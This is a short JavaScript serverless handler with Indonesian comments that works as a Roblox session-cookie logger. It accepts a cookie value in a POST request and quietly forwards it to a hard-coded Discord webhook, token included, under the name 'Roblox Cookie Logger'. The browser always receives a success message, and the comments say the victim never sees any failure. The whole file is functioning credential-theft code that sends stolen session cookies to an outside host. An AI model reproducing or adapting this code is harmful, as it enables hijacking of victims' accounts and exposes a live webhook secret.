// Import library node-fetch
import fetch from 'node-fetch';

export default async function handler(req, res) {
    // Hanya izinkan metode POST
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    // Ambil cookie dari body request
    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({ message: 'Cookie is required' });
    }

    // !!! WEBHOOK BARU SUDAH DIMASUKKAN !!!
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1473284471137767558/asp42MiZ5mb6XaOXVNRmiyVsxVl5tG5AeWy6pJ2TXq8-0Ak-Y6tuuozHpVLlySDbPHlG';

    const payload = {
        content: `🍪 **Cookie Baru Tertangkap!** 🍮\n\`\`\`${cookie}\`\`\``,
        username: "Roblox Cookie Logger",
        avatar_url: "https://i.imgur.com/rVw5B2W.png"
    };

    // Kirim ke Discord tanpa nunggu jawaban (anti-timeout)
    fetch(discordWebhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
    }).catch(error => {
        // Log error di server, tapi user nggak bakal liat
        console.error('Gagal kirim ke Discord (async):', error);
    });

    // Langsung kirim jawaban SUKSES ke browser
    res.status(200).json({ message: 'Success' });
}
